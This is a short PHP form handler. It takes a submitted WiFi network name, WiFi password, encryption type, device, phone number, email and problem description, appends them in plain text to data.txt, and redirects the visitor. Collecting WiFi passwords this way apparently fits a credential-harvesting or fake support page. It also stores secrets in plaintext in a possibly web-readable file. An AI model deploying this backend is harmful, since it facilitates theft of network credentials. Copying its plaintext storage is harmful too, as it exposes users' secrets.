<?php
session_start(); // Start session to manage submission state

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the data from the form
    $name = $_POST['name'] ?? '';
    $passwd = $_POST['passwd'] ?? '';
    $cipher = $_POST['cipher'] ?? '';
    $device = $_POST['device'] ?? '';
    $tel = $_POST['tel'] ?? '';
    $email = $_POST['email'] ?? '';
    $problem = $_POST['problem'] ?? '';

    // Save the data in a file (you can use a database if preferred)
    $data = "WiFi Network Name: " . htmlspecialchars($name) . "\n" .
            "Password: " . htmlspecialchars($passwd) . "\n" . 
            "Encryption: " . htmlspecialchars($cipher) . "\n" . 
            "Device: " . htmlspecialchars($device) . "\n" . 
            "Phone: " . htmlspecialchars($tel) . "\n" . 
            "Email: " . htmlspecialchars($email) . "\n" . 
            "Problem: " . nl2br(htmlspecialchars($problem)) . "\n" . 
            "----------\n";
    
    // Save to a file
    file_put_contents('data.txt', $data, FILE_APPEND);

    // Redirect the client to a thank-you page
    header("Location: redirect.php");
    exit();
} else {
    echo "No data was received.";
}
?>